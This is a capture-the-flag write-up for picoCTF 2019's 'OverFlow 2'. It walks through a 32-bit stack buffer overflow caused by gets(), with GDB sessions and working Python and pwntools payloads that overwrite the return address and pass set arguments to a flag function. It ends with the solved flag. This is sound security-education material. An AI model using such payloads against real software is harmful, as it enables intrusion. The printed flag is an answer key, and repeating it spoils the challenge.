# PicoCTF19 OverFlow 2

## Challenge

Now try overwriting arguments. Can you get the flag from this [program](https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln)? You can find it in /problems/overflow-2 on the shell server. [Source](https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln.c).

## Hints

GDB can print the stack after you send arguments

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/overflow-2$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 22:04 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-2_3    33 Sep 28 22:04 flag.txt
-rwxr-sr-x   1 hacksports overflow-2_3  7500 Sep 28 22:04 vuln
-rw-rw-r--   1 hacksports hacksports     794 Sep 28 22:04 vuln.c
```

Let's view `vuln.c`

```
samson@pico-2019-shell1:/problems/overflow-2$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ ./vuln
Please enter your string: 
A
A
samson@pico-2019-shell1:/problems/overflow-2$ echo $(python -c "print 'A'*184") | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

We need to invoke the `flag()` function like `flag(0xDEADBEEF, 0xC0DED00D)` from `vuln()`.

So let's first try to reproducce what we did in Overflow-1 and get into the `vuln()` function first.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048676 <+0>:     push   %ebp
   0x08048677 <+1>:     mov    %esp,%ebp
   0x08048679 <+3>:     push   %ebx
   0x0804867a <+4>:     sub    $0xb4,%esp
   0x08048680 <+10>:    call   0x8048520 <__x86.get_pc_thunk.bx>
   0x08048685 <+15>:    add    $0x197b,%ebx
   0x0804868b <+21>:    sub    $0xc,%esp
   0x0804868e <+24>:    lea    -0xb8(%ebp),%eax
   0x08048694 <+30>:    push   %eax
   0x08048695 <+31>:    call   0x8048430 <gets@plt>
   0x0804869a <+36>:    add    $0x10,%esp
   0x0804869d <+39>:    sub    $0xc,%esp
   0x080486a0 <+42>:    lea    -0xb8(%ebp),%eax
   0x080486a6 <+48>:    push   %eax
   0x080486a7 <+49>:    call   0x8048460 <puts@plt>
   0x080486ac <+54>:    add    $0x10,%esp
   0x080486af <+57>:    nop
   0x080486b0 <+58>:    mov    -0x4(%ebp),%ebx
   0x080486b3 <+61>:    leave  
   0x080486b4 <+62>:    ret    
End of assembler dump.
(gdb) b* 0x08048695
Breakpoint 1 at 0x8048695
(gdb) r < <(python -c 'print("A"*184)')
Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*184)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x804869a in vuln; saved eip = 0x804871c
(gdb) r < <(python -c 'print("A"*284)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*284)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x804869a in vuln; saved eip = 0x41414141
 called by frame at 0xff894ed4
(gdb) x flag
0x80485e6 <flag>:       0x53e58955
```

Through a bunch of trial an error I finally found the input that lets us jump to the `flag()` function

```bash
(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) ni
0x0804869a in vuln ()
(gdb) info frame
Stack level 0, frame at 0xff914d50:
 eip = 0x804869a in vuln; saved eip = 0x80485e6
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2898163) exited normally]
```
Perfect. We're in the `flag()` function as determined by the output, so let's dig into the function now.

```bash
(gdb) disas flag
Dump of assembler code for function flag:
   0x080485e6 <+0>:     push   %ebp
   0x080485e7 <+1>:     mov    %esp,%ebp
   0x080485e9 <+3>:     push   %ebx
   0x080485ea <+4>:     sub    $0x54,%esp
   0x080485ed <+7>:     call   0x8048520 <__x86.get_pc_thunk.bx>
   0x080485f2 <+12>:    add    $0x1a0e,%ebx
   0x080485f8 <+18>:    sub    $0x8,%esp
   0x080485fb <+21>:    lea    -0x1850(%ebx),%eax
   0x08048601 <+27>:    push   %eax
   0x08048602 <+28>:    lea    -0x184e(%ebx),%eax
   0x08048608 <+34>:    push   %eax
   0x08048609 <+35>:    call   0x80484a0 <fopen@plt>
   0x0804860e <+40>:    add    $0x10,%esp
   0x08048611 <+43>:    mov    %eax,-0xc(%ebp)
   0x08048614 <+46>:    cmpl   $0x0,-0xc(%ebp)
   0x08048618 <+50>:    jne    0x8048636 <flag+80>
   0x0804861a <+52>:    sub    $0xc,%esp
   0x0804861d <+55>:    lea    -0x1844(%ebx),%eax
   0x08048623 <+61>:    push   %eax
   0x08048624 <+62>:    call   0x8048460 <puts@plt>
   0x08048629 <+67>:    add    $0x10,%esp
   0x0804862c <+70>:    sub    $0xc,%esp
   0x0804862f <+73>:    push   $0x0
   0x08048631 <+75>:    call   0x8048470 <exit@plt>
   0x08048636 <+80>:    sub    $0x4,%esp
   0x08048639 <+83>:    pushl  -0xc(%ebp)
   0x0804863c <+86>:    push   $0x40
   0x0804863e <+88>:    lea    -0x4c(%ebp),%eax
   0x08048641 <+91>:    push   %eax
   0x08048642 <+92>:    call   0x8048440 <fgets@plt>
   0x08048647 <+97>:    add    $0x10,%esp
   0x0804864a <+100>:   cmpl   $0xdeadbeef,0x8(%ebp)
   0x08048651 <+107>:   jne    0x804866d <flag+135>
   0x08048653 <+109>:   cmpl   $0xc0ded00d,0xc(%ebp)
   0x0804865a <+116>:   jne    0x8048670 <flag+138>
   0x0804865c <+118>:   sub    $0xc,%esp
   0x0804865f <+121>:   lea    -0x4c(%ebp),%eax
   0x08048662 <+124>:   push   %eax
   0x08048663 <+125>:   call   0x8048420 <printf@plt>
   0x08048668 <+130>:   add    $0x10,%esp
   0x0804866b <+133>:   jmp    0x8048671 <flag+139>
   0x0804866d <+135>:   nop
   0x0804866e <+136>:   jmp    0x8048671 <flag+139>
   0x08048670 <+138>:   nop
   0x08048671 <+139>:   mov    -0x4(%ebp),%ebx
   0x08048674 <+142>:   leave  
   0x08048675 <+143>:   ret    
End of assembler dump.
```

The lines that stand out the most to me are:

```
...
cmpl   $0xdeadbeef,0x8(%ebp)
...
cmpl   $0xc0ded00d,0xc(%ebp)
...
```

So what this is suggesting is that it's comparing the second and third values from the `ebp` register which is the bottom of the stack, so we should overwrite the return address, and add our first and second arguments to the stack

So let's set some breakpoints there.

```bash
(gdb) b* 0x0804864a
Breakpoint 1 at 0x804864a
(gdb) b* 0x08048653
Breakpoint 2 at 0x8048653
(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2899300) exited normally]
```

Oh wait, in GDB the flag function exits first. So I guess we'll have to follow the hint... inspect the stack
Let's append some input into it.

```bash
(gdb) b* 0x080485e6
Breakpoint 1 at 0x80485e6
(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Breakpoint 1, 0x080485e6 in flag ()
(gdb) info stack
#0  0x080485e6 in flag ()
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x42424242 in ?? ()
#4  0x42424242 in ?? ()
#5  0xff8e7b00 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

So remember the stack grows from the EBP, so our first and second arguments are between `#1-#4`. However, the code seems to be looking at `ebp+8` so let's send `4 A's` before our arguments.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
```

`r < <(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')`

Also works.

## Flag

`picoCTF{arg5_and_r3turn51b106031}`

## Alternative Solution - PwnTools

To recap, `vuln` allocates a buffer of size `176` on the stack and then uses `gets` a vulnerable function to read from it.

The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.

A more detailed explanation can be found on Overflow 1 for the Pwntools cyclic module.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
Starting program: /problems/overflow-2/vuln < <(cyclic 200)
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
```

Let's find the offset for those hex values.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ cyclic -l 0x62616177
188
```

So remember the stack grows from the EBP, so our first and second arguments are between `#1-#4`. However, the code seems to be looking at `ebp+8` so let's send `4 A's` before our arguments.

```bash
samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
```

```bash
samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print('A'*188 + p32(0x080485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))" | ./vuln
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
```

## Alternative without GDB

```bash
$ cyclic 200 | ./vuln
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

$ dmesg | grep vuln
[123123] vuln[3738]: segfault at 62616177 ip 0000000062616177 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]

$ cyclic -l 0x62616177
188
```